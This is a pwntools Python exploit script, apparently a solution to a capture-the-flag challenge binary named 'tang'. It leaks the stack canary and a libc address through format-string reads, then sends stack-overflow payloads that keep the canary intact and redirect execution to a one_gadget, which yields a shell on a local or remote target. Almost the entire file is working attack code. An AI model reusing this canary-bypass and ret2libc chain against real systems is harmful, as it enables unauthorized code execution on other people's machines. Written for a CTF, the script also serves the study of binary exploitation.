#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './tang'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

debug()
sea('你怎么了？\n','%9$p') # canary
canary = eval(rc(18))
info_addr('canary',canary)

sea('烫烫烫烫烫烫烫烫烫烫烫烫\n','TaQini')

payload = cyclic(56)+p64(canary)
payload = payload.ljust(88,'T')
if is_local:
    payload += '\xc9'
if is_remote:
    payload += '\x16'

sea('...你把手离火炉远一点！\n',payload)

# round2
sea('你怎么了？\n','%23$p') # canary
libc_start_main_ret = eval(rc(14))
info_addr('libc_start_main_ret',libc_start_main_ret)
if is_remote:
    libcbase = libc_start_main_ret - 0x20830
if is_local:
    libcbase = libc_start_main_ret - 243 - libc.sym['__libc_start_main']
info_addr('libcbase',libcbase)

# prdi = 0x0000000000021102 + libcbase # pop rdi ; ret
# system = libc.sym['system'] + libcbase
if is_local:
    og = libcbase + 0x10afa9
if is_remote:
    og = libcbase + 0xf1147

# binsh = libc.search('/bin/sh').next() + libcbase

sea('烫烫烫烫烫烫烫烫烫烫烫烫\n','TaQini')

pl2 = cyclic(56)+p64(canary)
pl2 = pl2.ljust(88,'Q')
pl2 += p64(og)

sea('...你把手离火炉远一点！\n',pl2)

p.interactive()

